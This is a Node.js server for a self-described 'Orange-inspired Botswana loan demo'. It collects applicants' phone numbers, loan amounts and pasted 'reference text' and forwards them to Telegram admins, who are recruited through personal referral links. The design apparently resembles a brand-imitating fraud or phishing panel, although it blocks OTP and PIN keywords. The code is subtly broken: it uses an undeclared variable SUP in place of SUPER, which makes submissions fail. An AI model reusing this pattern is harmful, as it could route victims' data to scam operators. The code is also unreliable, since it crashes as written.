require('dotenv').config();
const express = require('express');
const crypto = require('crypto');
const { Pool } = require('pg');
const app = express();
app.use(express.json({limit:'20kb'}));
app.use(express.static('public'));
const PORT = process.env.PORT || 10000;
const pool = process.env.DATABASE_URL ? new Pool({connectionString:process.env.DATABASE_URL, ssl: process.env.DATABASE_URL.includes('localhost') ? false : {rejectUnauthorized:false}}) : null;
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const SUPER = String(process.env.SUPER_ADMIN_CHAT_ID || '');
const initialAdmins = (process.env.ADMIN_CHAT_IDS || '').split(',').map(s=>s.trim()).filter(Boolean);
let offset = 0, polling = false;
const APP = 'Orange-inspired Botswana loan demo';
async function initDb(){
 if(!pool) return;
 // Unique table names prevent collisions with other portals sharing this PostgreSQL database.
 await pool.query(`CREATE TABLE IF NOT EXISTS orange_demo_applications (
  id TEXT PRIMARY KEY, phone TEXT NOT NULL, amount NUMERIC(12,2) NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending_details', reference_text TEXT,
  assigned_admin TEXT, reviewer TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 )`);
 await pool.query(`CREATE TABLE IF NOT EXISTS orange_demo_admins (
  chat_id TEXT PRIMARY KEY, active BOOLEAN NOT NULL DEFAULT TRUE, referral_code TEXT UNIQUE,
  added_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
 )`);
 await pool.query('ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS reference_text TEXT');
 await pool.query('ALTER TABLE orange_demo_applications ADD COLUMN IF NOT EXISTS assigned_admin TEXT');
 for(const id of initialAdmins) await addAdmin(id);
}
async function api(method, body){
 if(!TOKEN) return null;
 const r=await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body||{})});
 const j=await r.json(); if(!j.ok) console.error('Telegram API error:',j.description); return j;
}
async function send(chat_id,text,extra={}){ return api('sendMessage',{chat_id,text,parse_mode:'HTML',...extra}); }
function esc(s){return String(s??'').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
async function addAdmin(id){
 const code=crypto.randomBytes(5).toString('hex').toUpperCase();
 await pool.query(`INSERT INTO orange_demo_admins(chat_id,active,referral_code) VALUES($1,TRUE,$2) ON CONFLICT(chat_id) DO UPDATE SET active=TRUE, referral_code=COALESCE(orange_demo_admins.referral_code,EXCLUDED.referral_code)`,[String(id),code]);
}
async function isAdmin(id){ if(String(id)===SUPER) return true; if(!pool) return initialAdmins.includes(String(id)); const r=await pool.query('SELECT active FROM orange_demo_admins WHERE chat_id=$1',[String(id)]); return !!r.rows[0]?.active; }
async function activeAdmins(){if(!pool)return initialAdmins;return (await pool.query('SELECT chat_id FROM orange_demo_admins WHERE active=TRUE')).rows.map(x=>x.chat_id);}
function decisionKeyboard(stage,id){return {inline_keyboard:[[{text:'✅ Approve',callback_data:`decide:approve:${stage}:${id}`},{text:'❌ Reject',callback_data:`decide:reject:${stage}:${id}`}]]};}
async function notifyAdmins(message,keyboard,assignedAdmin=null){const recipients=assignedAdmin&&await isAdmin(assignedAdmin)?[String(assignedAdmin)]:await activeAdmins();for(const id of recipients) await send(id,message,{reply_markup:keyboard}); if(SUP) await send(SUP,`👁️ <b>SUPER ADMIN — VIEW ONLY COPY</b>\n\n${message}`);}
async function notifyDetails(a){
 const msg=`🟠 <b>New demo application — details review</b>\n\n🆔 <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n💰 Requested: <b>BWP ${Number(a.amount).toLocaleString('en-BW',{minimumFractionDigits:2,maximumFractionDigits:2})}</b>\n📌 Status: DETAILS PENDING\n\nThis is an independent demo. Review the application details only.`;
 await notifyAdmins(msg,decisionKeyboard('details',a.id),a.assigned_admin);
}
async function notifyReference(a){
 const msg=`🟠 <b>Reference text submitted — review required</b>\n\n🆔 Application: <code>${esc(a.id)}</code>\n📞 Phone: <code>${esc(a.phone)}</code>\n📝 Reference text:\n<blockquote>${esc(a.reference_text)}</blockquote>\n📌 Status: REFERENCE PENDING\n\nReview only non-secret application reference text. Never request PINs, passwords, or OTPs.`;
 await notifyAdmins(msg,decisionKeyboard('reference',a.id),a.assigned_admin);
}
app.get('/health',(req,res)=>res.json({ok:true,service:'independent Botswana loan application demo'}));
app.post('/api/applications',async(req,res)=>{
 try{
  if(!pool) return res.status(503).json({error:'Application storage is not configured yet.'});
  const phone=String(req.body.phone||'').trim(); const amount=Number(req.body.amount); const referral=String(req.body.ref||'').trim();
  if(!/^\+?[0-9]{7,15}$/.test(phone)) return res.status(400).json({error:'Enter a valid phone number.'});
  if(!Number.isFinite(amount)||amount<50||amount>100000) return res.status(400).json({error:'Enter an amount from BWP 50 to BWP 100,000.'});
  let assigned=null;if(referral){const ar=await pool.query('SELECT chat_id FROM orange_demo_admins WHERE referral_code=$1 AND active=TRUE',[referral]);if(ar.rows[0])assigned=ar.rows[0].chat_id;}
  const id='BW-'+Date.now().toString(36).toUpperCase()+'-'+crypto.randomBytes(2).toString('hex').toUpperCase();
  const result=await pool.query("INSERT INTO orange_demo_applications(id,phone,amount,assigned_admin) VALUES($1,$2,$3,$4) RETURNING *",[id,phone,amount,assigned]);
  await notifyDetails(result.rows[0]); res.status(201).json({id,status:'pending_details'});
 }catch(e){console.error(e);res.status(500).json({error:'Could not submit the application. Please try again later.'});}
});
app.post('/api/applications/:id/reference',async(req,res)=>{
 try{
  const reference=String(req.body.reference_text||'').trim();
  if(reference.length<3||reference.length>1000) return res.status(400).json({error:'Paste a reference text between 3 and 1,000 characters.'});
  if(/\b(OTP|one[- ]time password|PIN|password|passcode)\b/i.test(reference)) return res.status(400).json({error:'Do not submit OTPs, PINs, passwords, or account security codes. Enter only a non-secret application reference.'});
  const r=await pool.query("UPDATE orange_demo_applications SET reference_text=$1,status='pending_reference',updated_at=NOW() WHERE id=$2 AND status='approved_details' RETURNING *",[reference,req.params.id]);
  if(!r.rows[0])return res.status(409).json({error:'Reference submission is available only after the details have been approved.'});
  await notifyReference(r.rows[0]);res.json({id:r.rows[0].id,status:r.rows[0].status});
 }catch(e){console.error(e);res.status(500).json({error:'Could not submit the reference text. Please try again.'});}
});
app.get('/api/applications/:id',async(req,res)=>{try{const r=await pool.query('SELECT id,status,amount,updated_at FROM orange_demo_applications WHERE id=$1',[req.params.id]);if(!r.rows[0])return res.status(404).json({error:'Application not found'});res.json(r.rows[0]);}catch(e){res.status(503).json({error:'Storage unavailable'});}});
async function handleMessage(m){
 const id=String(m.chat.id), t=String(m.text||'').trim();
 if(t==='/start'||t==='/myinfo'){
  const role=id===SUPER?'Super Admin (management + view-only application copies)':(await isAdmin(id)?'Application Admin':'Applicant / not assigned admin');
  let extra='';if(id===SUPER)extra='\n\nSuper Admin commands:\n/addadmin CHAT_ID\n/revokeadmin CHAT_ID\n/admins\n/stats';
  if(await isAdmin(id))extra+='\n\nAdmin commands: /mylink /pending /stats /myinfo';
  return send(id,`👋 <b>${APP}</b>\nYour Chat ID: <code>${id}</code>\nRole: <b>${role}</b>${extra}`);
 }
 if(t.startsWith('/addadmin ')){
  if(id!==SUPER)return send(id,'Admin access required.');const target=t.split(/\s+/)[1];if(!/^\d+$/.test(target))return send(id,'Usage: /addadmin CHAT_ID');
  await addAdmin(target);const row=await pool.query('SELECT referral_code FROM orange_demo_admins WHERE chat_id=$1',[target]);await send(id,`✅ Admin ${target} added.\nPersonal customer link:\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?ref='+row.rows[0].referral_code)}`);await send(target,'👋 You have been assigned as an application admin. Send /start, then /mylink to get your personal customer link.');return;
 }
 if(t.startsWith('/revokeadmin ')){if(id!==SUPER)return send(id,'Admin access required.');const target=t.split(/\s+/)[1];if(!/^\d+$/.test(target))return send(id,'Usage: /revokeadmin CHAT_ID');await pool.query('UPDATE orange_demo_admins SET active=FALSE WHERE chat_id=$1',[target]);return send(id,`Admin ${target} revoked.`);}
 if(t==='/admins'){if(id!==SUPER)return send(id,'Super Admin access required.');const r=await pool.query('SELECT chat_id,active,referral_code FROM orange_demo_admins ORDER BY added_at DESC');return send(id,r.rows.length?r.rows.map(a=>`${a.active?'✅':'⛔'} <code>${a.chat_id}</code> · ${a.referral_code||'no link'}`).join('\n'):'No admins configured.');}
 if(t==='/mylink'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=await pool.query('SELECT referral_code FROM orange_demo_admins WHERE chat_id=$1 AND active=TRUE',[id]);if(!r.rows[0])return send(id,'No active admin link is assigned to your account.');return send(id,`🔗 <b>Your personal customer link</b>\n${esc((process.env.APP_BASE_URL||'').replace(/\/$/,'')+'/?ref='+r.rows[0].referral_code)}\n\nShare this link to associate demo applications with your admin account.`);}
 if(t==='/pending'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=await pool.query("SELECT id,status,amount FROM orange_demo_applications WHERE status IN ('pending_details','pending_reference') ORDER BY created_at DESC LIMIT 20");return send(id,r.rows.length?r.rows.map(a=>`${a.id} — ${a.status} — BWP ${a.amount}`).join('\n'):'No pending applications.');}
 if(t==='/stats'){if(!(await isAdmin(id)))return send(id,'Admin access required.');const r=await pool.query('SELECT status,count(*)::int n FROM orange_demo_applications GROUP BY status');return send(id,'📊 Demo application stats\n'+(r.rows.map(x=>`${x.status}: ${x.n}`).join('\n')||'No applications yet.'));}
}
async function handleCallback(q){
 const chat=String(q.message?.chat?.id||''),data=String(q.data||'');if(!data.startsWith('decide:'))return;
 if(chat===SUPER){await api('answerCallbackQuery',{callback_query_id:q.id,text:'Super Admin receives view-only copies; an active admin must review.'});return;}
 if(!(await isAdmin(chat))){await api('answerCallbackQuery',{callback_query_id:q.id,text:'Not authorized.'});return;}
 const [,decision,stage,appId]=data.split(':');if(!['approve','reject'].includes(decision)||!['details','reference'].includes(stage))return;
 const status=stage==='details'?(decision==='approve'?'approved_details':'rejected_details'):(decision==='approve'?'approved':'rejected_reference');
 const expected=stage==='details'?'pending_details':'pending_reference';
 const r=await pool.query('UPDATE orange_demo_applications SET status=$1,reviewer=$2,updated_at=NOW() WHERE id=$3 AND status=$4 RETURNING *',[status,chat,appId,expected]);
 if(!r.rows[0]){await api('answerCallbackQuery',{callback_query_id:q.id,text:'Already reviewed or not found.'});return;}
 await api('answerCallbackQuery',{callback_query_id:q.id,text:`Marked ${status}.`});await send(chat,`Application <code>${appId}</code> marked <b>${esc(status)}</b>.`);
 if(SUP)await send(SUP,`👁️ VIEW ONLY — Decision update\nApplication: <code>${esc(appId)}</code>\nStatus: <b>${esc(status)}</b>`);
}
async function poll(){if(polling||!TOKEN)return;polling=true;try{while(true){const r=await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${offset}&timeout=20`);const j=await r.json();if(!j.ok){console.error('Telegram polling stopped:',j.description);break;}for(const u of j.result||[]){offset=u.update_id+1;try{if(u.message)await handleMessage(u.message);if(u.callback_query)await handleCallback(u.callback_query);}catch(e){console.error('Telegram update error:',e.message);}}}}catch(e){console.error('Telegram polling error:',e.message);}finally{polling=false;setTimeout(poll,2500);}}
(async()=>{try{await initDb();app.listen(PORT,()=>console.log(`${APP} listening on ${PORT}`));if(TOKEN)poll();else console.warn('TELEGRAM_BOT_TOKEN not configured; Telegram features disabled.');}catch(e){console.error('Startup failed:',e);process.exit(1);}})();
